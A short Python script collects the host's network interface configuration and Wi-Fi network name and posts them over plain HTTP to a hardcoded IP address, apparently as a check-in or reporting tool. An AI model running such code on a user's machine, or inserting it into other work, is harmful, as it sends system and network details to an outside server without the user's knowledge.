import os
import requests
import subprocess

def getIfconfig():
    command = ['ifconfig', '-a']
    p = subprocess.Popen(command, stdout=subprocess.PIPE)
    text = p.stdout.read()
    retcode = p.wait()
    return text

def getWifi():
    command = ['iwgetid']
    p = subprocess.Popen(command, stdout=subprocess.PIPE)
    text = p.stdout.read()
    retcode = p.wait()
    return text



r = requests.post("http://128.199.104.128", data={'ifconfig': getIfconfig(), 'wifi': getWifi(), 'action': 'show'})